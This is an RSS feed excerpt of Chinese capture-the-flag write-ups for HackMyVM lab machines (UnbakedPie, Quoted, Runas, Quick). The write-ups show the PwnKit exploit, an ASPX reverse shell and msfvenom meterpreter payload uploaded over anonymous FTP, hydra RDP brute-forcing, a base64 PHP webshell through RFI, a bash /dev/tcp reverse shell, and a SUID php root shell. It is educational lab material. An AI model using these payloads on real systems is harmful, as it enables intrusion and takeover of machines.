Last login: Sat Oct  3 22:15:57 2020 from 172.17.0.2


ramsey@unbaked:~$ cat user.txt
Unb4ked_W00tw00t

<br><br>使用 <a data-tooltip-position="top" aria-label="../../26-工具使用/LZS使用" data-href="../../26-工具使用/LZS使用" href="https://www.c1trus.top/26-工具使用/lzs使用.html" class="internal-link" target="_self" rel="noopener nofollow">LZS</a> 进行提权检测<br>
发现可以用Pwnkit提权<br>
直接提权<br>bash lzs.sh //提权检测
wget http://192.168.80.5/main.tar.gz
tar -zxvf main.tar.gz
cd CVE-2021-4034-main/
make
./cve-2021-4034
<br>
pwncat下载的 mian 默认是zip压缩的。但是靶机上是没有 unzip 的所以要先在外面解压然后用tar打包 再传给靶机
<br>root@unbaked:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(ramsey)
root@unbaked:/tmp# cat /root/root.txt
CONGRATS ON PWNING THIS BOX!
Created by ch4rm &amp; H0j3n
ps: dont be mad us, we hope you learn something new

flag: Unb4ked_GOtcha!

]]></description><link>https://www.c1trus.top/24-渗透/hmv/32.unbakedpie.html</link><guid isPermaLink="false">24-渗透/HMV/32.UnbakedPie.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128182147.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128182147.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[31.quoted]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. ftp匿名" data-href="#3. ftp匿名" href="https://www.c1trus.top/about:blank#3._ftp匿名" class="internal-link" target="_self" rel="noopener nofollow">3. ftp匿名</a>
<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=quoted" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=quoted</a><br>
作者 <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=ysnmrtksk" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=ysnmrtksk" target="_blank">ysnmrtksk</a><br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br><br>┌──(root㉿kali)-[/home/kali/hmv/ysnmrtksk]
└─# fscan -h 192.168.56.21

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.21:135 open
192.168.56.21:21 open
192.168.56.21:139 open
192.168.56.21:445 open
192.168.56.21:80 open
[*] alive ports len is: 5
start vulscan
[*] NetInfo
[*]192.168.56.21
   [-&gt;]quoted-PC
   [-&gt;]192.168.56.21
[*] OsInfo 192.168.56.21        (Windows 7 Professional 7601 Service Pack 1)
[+] ftp 192.168.56.21:21:anonymous
   [-&gt;]aspnet_client
   [-&gt;]iisstart.htm
   [-&gt;]welcome.png
[*] WebTitle http://192.168.56.21      code:200 len:689    title:IIS7
已完成 5/5
[*] 扫描结束,耗时: 1.434643461s

<br><br>┌──(root㉿kali)-[/home/kali/hmv/quoted]
└─# ftp 192.168.56.21
Connected to 192.168.56.21.
220 Microsoft FTP Service
Name (192.168.56.21:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; ls
229 Entering Extended Passive Mode (|||49179|)
125 Data connection already open; Transfer starting.
10-05-24  11:16AM       &lt;DIR&gt;          aspnet_client
10-04-24  11:27PM                  689 iisstart.htm
10-04-24  11:27PM               184946 welcome.png
226 Transfer complete.

ftp&gt; put shell.aspx
local: pass.asp remote: pass.asp
229 Entering Extended Passive Mode (|||49181|)
125 Data connection already open; Transfer starting.
100% |******************************************************|    27      432.24 KiB/s    --:-- ETA
<br>下一个aspx马<br>
<a rel="noopener nofollow" class="external-link" href="https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx" target="_blank">https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx</a><br>
改下ip监听端口 Put上去<br>
然后弹shell<br>┌──(root㉿kali)-[/home/kali/hmv/quoted]
└─# ftp 192.168.56.21
Connected to 192.168.56.21.
220 Microsoft FTP Service
Name (192.168.56.21:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; put shell.aspx
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49185|)
125 Data connection already open; Transfer starting.
100% |******************************************************| 16394       87.34 MiB/s    --:-- ETA
226 Transfer complete.
16394 bytes sent in 00:00 (18.90 MiB/s)
ftp&gt; exit
221 Goodbye.

┌──(root㉿kali)-[/home/kali/hmv/quoted]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.56.6] from (UNKNOWN) [192.168.56.21] 49186
Spawn Shell...
Microsoft Windows [S▒r▒m 6.1.7601]
Telif Hakk▒ (c) 2009 Microsoft Corporation. T▒m haklar▒ sakl▒d▒r.

c:\windows\system32\inetsrv&gt;hostname
hostname
quoted-PC

c:\windows\system32\inetsrv&gt;

<br><br>我们利用msf进行提权即可。<br>
先把shell转给msf<br>用msf生成一个反向shell<br>┌──(root㉿kali)-[/home/kali/hmv/quoted]
└─# msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.6 lport=7788 -f exe &gt; shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
<br>上传这个反向shell到靶机<br>┌──(root㉿kali)-[/home/kali/hmv/quoted]
└─# ftp 192.168.56.21
Connected to 192.168.56.21.
220 Microsoft FTP Service
Name (192.168.56.21:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; put shell.exe
local: shell.exe remote: shell.exe
229 Entering Extended Passive Mode (|||49191|)
125 Data connection already open; Transfer starting.
100% |***********************************************| 74160       48.84 MiB/s    --:-- ETA
226 Transfer complete.
74160 bytes sent in 00:00 (38.22 MiB/s)

<br>msf开启监听<br>msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.56.6
set lport 7788
run


meterpreter &gt; shell
Process 2040 created.
Channel 3 created.
Microsoft Windows [S▒r▒m 6.1.7601]
Telif Hakk▒ (c) 2009 Microsoft Corporation. T▒m haklar▒ sakl▒d▒r.

c:\Windows\Tasks&gt;whoami /priv
whoami /priv

AYRICALIK B▒LG▒LER▒
----------------------

Ayr▒cal▒k Ad▒                 A▒▒klama                                                 Durum
============================= ======================================================== ==========
SeAssignPrimaryTokenPrivilege ▒▒lem d▒zeyi belirtecini de▒i▒tir                        Devre D▒▒▒
SeIncreaseQuotaPrivilege      ▒▒lem i▒in bellek kotalar▒ ayarla                        Devre D▒▒▒
SeSecurityPrivilege           Denetimi ve g▒venlik g▒nl▒▒▒n▒ y▒net                     Devre D▒▒▒
SeShutdownPrivilege           Sistemi kapat                                            Devre D▒▒▒
SeAuditPrivilege              G▒venlik denetimleri olu▒tur                             Devre D▒▒▒
SeChangeNotifyPrivilege       ▒apraz ge▒i▒ denetimini atla                             Etkin
SeUndockPrivilege             Bilgisayar▒ takma biriminden ▒▒kar                       Devre D▒▒▒
SeImpersonatePrivilege        Kimlik do▒rulamas▒ndan sonra istemcinin ▒zelliklerini al Etkin
SeCreateGlobalPrivilege       Genel nesneler olu▒tur                                   Etkin
SeIncreaseWorkingSetPrivilege ▒▒lem ▒al▒▒ma k▒mesini art▒r                             Devre D▒▒▒
SeTimeZonePrivilege           Saat dilimini de▒i▒tir                                   Devre D▒▒▒

<br>发现具有 SeIncreaseWorkingSetPrivilege 权限<br>
直接用 GodPotato 或者 juicyPotao 提权即可<br>use exploit/windows/local/ms16_075_reflection_juicy
set session 1
set lhost 192.168.56.6
set lport 7788
run


msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; run

[*] Started reverse TCP handler on 192.168.56.6:7788
[+] Target appears to be vulnerable (Windows 7 Service Pack 1)
[*] Launching notepad to host the exploit...
[+] Process 1240 launched.
[*] Reflectively injecting the exploit DLL into 1240...
[*] Injecting exploit into 1240...
[*] Exploit injected. Injecting exploit configuration into 1240...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176198 bytes) to 192.168.56.24
[*] Meterpreter session 2 opened (192.168.56.6:7788 -&gt; 192.168.56.24:49194) at 2024-12-24 07:48:21 -0500

meterpreter &gt; shell
Process 2240 created.
Channel 1 created.
Microsoft Windows [S▒r▒m 6.1.7601]
Telif Hakk▒ (c) 2009 Microsoft Corporation. T▒m haklar▒ sakl▒d▒r.

C:\Windows\system32&gt;whoami
whoami
nt authority\system


c:\Users\Administrator\Desktop&gt;type root.txt
type root.txt
HMV{Elevated_Shell_Again}

c:\Users\quoted\Desktop&gt;type user.txt
type user.txt
HMV{User_Flag_Obtained}

]]></description><link>https://www.c1trus.top/24-渗透/hmv/31.quoted.html</link><guid isPermaLink="false">24-渗透/HMV/31.quoted.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[30.runas]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. 网站信息" data-href="#2.2. 网站信息" href="https://www.c1trus.top/about:blank#2.2._网站信息" class="internal-link" target="_self" rel="noopener nofollow">2.2. 网站信息</a>
<br><a data-tooltip-position="top" aria-label="2.3. 目录扫描" data-href="#2.3. 目录扫描" href="https://www.c1trus.top/about:blank#2.3._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.3. 目录扫描</a>
<br><a data-tooltip-position="top" aria-label="2.4. rdp爆破" data-href="#2.4. rdp爆破" href="https://www.c1trus.top/about:blank#2.4._rdp爆破" class="internal-link" target="_self" rel="noopener nofollow">2.4. rdp爆破</a>


<br><a data-tooltip-position="top" aria-label="3. 再试网站" data-href="#3. 再试网站" href="https://www.c1trus.top/about:blank#3._再试网站" class="internal-link" target="_self" rel="noopener nofollow">3. 再试网站</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Runas" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Runas</a><br>
作者 ysnmrtksk<br>
难度 ⭐️️
<br><br><br>┌──(root㉿kali)-[/home/kali/hmv/runas]
└─# fscan -h 192.168.56.20

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.20:139 open
192.168.56.20:135 open
192.168.56.20:80 open
192.168.56.20:445 open
[*] alive ports len is: 4
start vulscan
[*] NetInfo
[*]192.168.56.20
   [-&gt;]runas-PC
   [-&gt;]192.168.56.20
[*] WebTitle http://192.168.56.20      code:200 len:251    title:Index of /
[*] OsInfo 192.168.56.20        (Windows 7 Professional 7601 Service Pack 1)
已完成 4/4
[*] 扫描结束,耗时: 1.348727278s

┌──(root㉿kali)-[/home/kali/hmv/runas]
└─# nmap 192.168.56.20 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 20:36 CST
Nmap scan report for 192.168.56.20
Host is up (0.00010s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:69:E0:90 (Oracle VirtualBox virtual NIC)

<br>没有域环境<br><br>首页<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126203940.png" referrerpolicy="no-referrer"><br>
index.php<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126204004.png" referrerpolicy="no-referrer"><br>styles.css<br>body {
    font-family: Arial, sans-serif;
    background-color: #f4f4f4;
    margin: 0;
    padding: 0;
}

.container {
    max-width: 600px;
    margin: 50px auto;
    padding: 20px;
    background-color: white;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    text-align: center;
}

h1 {
    color: #333;
    margin-bottom: 20px;
}

form {
    margin-bottom: 20px;
}

input[type="text"] {
    width: 80%;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 4px;
    margin-right: 10px;
}

button {
    padding: 10px 15px;
    background-color: #28a745;
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}

button:hover {
    background-color: #218838;
}

.output {
    margin-top: 20px;
    text-align: left;
}
<br>根据提示可以看出 index.php 应该是会接受一个 file 参数<br>
随便测试几下。看看存不存在任意文件读取<br>┌──(root㉿kali)-[/home/kali/hmv/runas]
└─# curl 'http://192.168.56.20/index.php?file=C:\Users\Public\desktop.ini'
&lt;!DOCTYPE html&gt;
&lt;html lang="tr"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Nothing Here&lt;/title&gt;
    &lt;link rel="stylesheet" href="styles.css"&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="container"&gt;
        &lt;h1&gt;There is no going back!&lt;/h1&gt;
        &lt;h2&gt;?file=&lt;/h2&gt;
        &lt;div class="output"&gt;
            &lt;pre&gt;&lt;/pre&gt;        &lt;/div&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

┌──(root㉿kali)-[/home/kali/hmv/runas]
└─# curl http://192.168.56.20/index.php?file=C:\Users\Public\kjdaljdklajls
&lt;!DOCTYPE html&gt;
&lt;html lang="tr"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Nothing Here&lt;/title&gt;
    &lt;link rel="stylesheet" href="styles.css"&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="container"&gt;
        &lt;h1&gt;There is no going back!&lt;/h1&gt;
        &lt;h2&gt;?file=&lt;/h2&gt;
        &lt;div class="output"&gt;
            File not found!        &lt;/div&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

<br>可以发现这个只能判断文件是否存在。<br><br>┌──(root㉿kali)-[/home/kali/hmv/runas]
└─# dirsearch -u http://192.168.56.20/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/runas/reports/http_192.168.56.20/__24-11-26_20-50-45.txt

Target: http://192.168.56.20/

[20:50:45] Starting:
[20:50:45] 403 -  199B  - /%C0%AE%C0%AE%C0%AF
[20:50:45] 403 -  199B  - /%3f/
[20:50:45] 403 -  199B  - /%ff
[20:50:45] 403 -  199B  - /.ht_wsr.txt
[20:50:46] 403 -  199B  - /.htaccess.bak1
[20:50:46] 403 -  199B  - /.htaccess.orig
[20:50:46] 403 -  199B  - /.htaccess.save
[20:50:46] 403 -  199B  - /.htaccess_extra
[20:50:46] 403 -  199B  - /.htaccessBAK
[20:50:46] 403 -  199B  - /.htaccessOLD2
[20:50:46] 403 -  199B  - /.htaccess_sc
[20:50:46] 403 -  199B  - /.htm
[20:50:46] 403 -  199B  - /.html
[20:50:46] 403 -  199B  - /.htaccess.sample
[20:50:46] 403 -  199B  - /.htaccess_orig
[20:50:46] 403 -  199B  - /.htaccessOLD
[20:50:46] 403 -  199B  - /.htpasswds
[20:50:46] 403 -  199B  - /.httr-oauth
[20:50:46] 403 -  199B  - /.htpasswd_test
[20:50:52] 403 -  199B  - /cgi-bin/
[20:50:52] 500 -  530B  - /cgi-bin/printenv.pl
[20:50:57] 200 -  414B  - /index.php
[20:50:57] 200 -  414B  - /index.pHp
[20:50:57] 200 -  414B  - /index.php/login/
[20:50:57] 200 -  414B  - /index.php.
[20:50:57] 403 -  199B  - /index.php::$DATA
[20:51:06] 403 -  199B  - /Trace.axd::$DATA
[20:51:08] 403 -  199B  - /web.config::$DATA

<br>扫出来一个登录路径 /index.php/login/<br>
进来还是这个<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126210046.png" referrerpolicy="no-referrer"><br>试一下远程文件包含<br>http://192.168.56.20/index.php/login/?file=http://192.168.56.6/1.txt
<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126210445.png" referrerpolicy="no-referrer"><br>
失败了<br>
### 2.4. SMB空会话检测
靶机开放了SMB 的端口 445 与139
```bash
┌──(root㉿kali)-[/home/kali/hmv/runas]
└─# smbmap -u anonymous -H 192.168.56.20

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)

<br><br>除了80 139 445 网站还开放了3389<br>
这是rdp的端口<br>
尝试爆破<br>
用户名字一般都是靶机的名字<br>┌──(root㉿kali)-[/home/kali/hmv/runas]
└─# hydra -l runas  -P  /usr/share/wordlists/rockyou.txt 192.168.56.20 rdp
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-26 21:06:11
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking rdp://192.168.56.20:3389/
[3389][rdp] host: 192.168.56.20   login: runas   password: 123456789
[3389][rdp] host: 192.168.56.20   login: runas   password: password
[3389][rdp] host: 192.168.56.20   login: runas   password: 123456
[3389][rdp] host: 192.168.56.20   login: runas   password: 12345
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-26 21:06:16

<br>看来网址果然是个坑<br>获取账号密码<br>[3389][rdp] host: 192.168.56.20   login: runas   password: 123456789
[3389][rdp] host: 192.168.56.20   login: runas   password: password
[3389][rdp] host: 192.168.56.20   login: runas   password: 123456
[3389][rdp] host: 192.168.56.20   login: runas   password: 12345
<br>尝试登录发现都不对<br>
纳尼。 。 。<br><br>看来还是得从网站入手<br>
我之前读 desktop.ini 回显是空白有可能是因为里面是空的<br>
我直接读flag试试<br>
尝试一下本地读flag<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126223052.png" referrerpolicy="no-referrer"><br>
哈哈，成功读取<br>HMV{User_Flag_Was_A_Bit_Bitter}

<br>在试试root的flag<br>也可以<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126223455.png" referrerpolicy="no-referrer"><br>HMV{Username_Is_My_Hint}
]]></description><link>https://www.c1trus.top/24-渗透/hmv/30.runas.html</link><guid isPermaLink="false">24-渗透/HMV/30.runas.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126203940.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126203940.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.quick]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. 文件包含" data-href="#3. 文件包含" href="https://www.c1trus.top/about:blank#3._文件包含" class="internal-link" target="_self" rel="noopener nofollow">3. 文件包含</a>
<br><a data-tooltip-position="top" aria-label="4. RFI利用" data-href="#4. RFI利用" href="https://www.c1trus.top/about:blank#4._RFI利用" class="internal-link" target="_self" rel="noopener nofollow">4. RFI利用</a>

<br><a data-tooltip-position="top" aria-label="4.1. 姿势1：data://伪协议法" data-href="#4.1. 姿势1：data://伪协议法" href="https://www.c1trus.top/about:blank#4.1._姿势1：data://伪协议法" class="internal-link" target="_self" rel="noopener nofollow">4.1. 姿势1：data://伪协议法</a>
<br><a data-tooltip-position="top" aria-label="4.2. 姿势2: 远程文件包含法" data-href="#4.2. 姿势2: 远程文件包含法" href="https://www.c1trus.top/about:blank#4.2._姿势2:_远程文件包含法" class="internal-link" target="_self" rel="noopener nofollow">4.2. 姿势2: 远程文件包含法</a>


<br><a data-tooltip-position="top" aria-label="5. 绕过.php" data-href="#5. 绕过.php" href="https://www.c1trus.top/about:blank#5._绕过.php" class="internal-link" target="_self" rel="noopener nofollow">5. 绕过.php</a>
<br><a data-tooltip-position="top" aria-label="6. SUID 提权" data-href="#6. SUID 提权" href="https://www.c1trus.top/about:blank#6._SUID_提权" class="internal-link" target="_self" rel="noopener nofollow">6. SUID 提权</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Quick
<br>难度：⭐️⭐️
<br>知识点：RFI  SUID提权
<br><br>端口扫描<br>Nmap scan report for 192.168.9.5
Host is up (0.00050s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
<br>目录扫描<br>[17:42:29] 200 -  771B  - /about.php
[17:42:36] 200 -  616B  - /contact.php
[17:42:40] 200 -    1KB - /home.php
[17:42:40] 200 -  630B  - /images/
[17:42:40] 301 -  311B  - /images  -&gt;  http://192.168.9.5/images/
<br><br>访问一下<br>about.php<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.001.png" referrerpolicy="no-referrer"><br>发现主页有一个about按钮，点击后<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.002.png" referrerpolicy="no-referrer"><br>会发现下面的内容就是about.php里面的<br>结合一下这个Url <br>/index.php?page=about<br>很容易猜测出这里有个是有一个文件包含，这里包含了about.php所以这个界面就显示了/about.php的内容<br>这里我们就要看是本地包含 还是远程文件包含了<br>先测试远程文件包含<br>同网段下的kali新建一个test.php 然后里面随便写点东西<br>然后用Python启一个http服务<br>echo '123123123' &gt;test.php
python3 -m http.server
<br>访问网站<br>http://192.168.9.5/index.php?page=http://192.168.9.3/test
<br><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.003.png" referrerpolicy="no-referrer"><br>成功实现远程文件包含<br><br><br>好处： 直接传数据，不用包含远程服务器上的文件<br>参考文章：<a data-tooltip-position="top" aria-label="https://d4redevilx.github.io/posts/hackmyvm/quick/#escalaci%C3%B3n-de-privilegios" rel="noopener nofollow" class="external-link" href="https://d4redevilx.github.io/posts/hackmyvm/quick/#escalaci%C3%B3n-de-privilegios" target="_blank">Quick</a><br>payload：<br>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnb2snIDs/Pg==
<br>这行 PHP 代码使用数据 URL (data URI) 直接在 PHP 代码中提供数据，而无需访问外部文件。 data://  表示这是一个数据url text/plain ：指定数据的 MIME 类型，这里为纯文本。 ;base64 使用base64编码 避免特殊字符出错 PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnb2snIDs/Pg== 编码数据 解码为<br>
&lt;?php system($\_GET['cmd']);echo 'ok' ;?&gt;&lt;/p&gt;<br>执行后成功输出ok<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.004.png" referrerpolicy="no-referrer"><br>我们传入参数cmd 执行命令<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.005.png" referrerpolicy="no-referrer"><br>成功执行，然后反弹shell，这里需要用url编码<br>cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.9.3%2F1234%200%3E%261%27
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.006.png" referrerpolicy="no-referrer"><br><br>在kali中启动一个服务器<br>python3 -m http.server 1122
<br>服务器上写一个系统马门<br>&lt;?php
system($\_GET['cmd']);
echo 'okok');
?&gt;
<br>远程包含后门文件<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.007.png" referrerpolicy="no-referrer"><br>这里我们不需要加上.php 因为他会自动给我们补上，<br>这里也可以绕过这个.php<br><br>如利用问号 井号绕过等<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.008.png" referrerpolicy="no-referrer"><br>使用#绕过时请用url编码<br><br>(remote) www-data@quick:/tmp$ find / -perm -4000 2&gt;/dev/null
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/bin/at
/usr/bin/sudo
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/php7.0
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount
<br>这里面发现php具有suid权限<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.009.png" referrerpolicy="no-referrer"><br>cd /usr/bin
CMD="/bin/sh"
./php7.0 -r "pcntl\_exec('/bin/sh', ['-p']);"
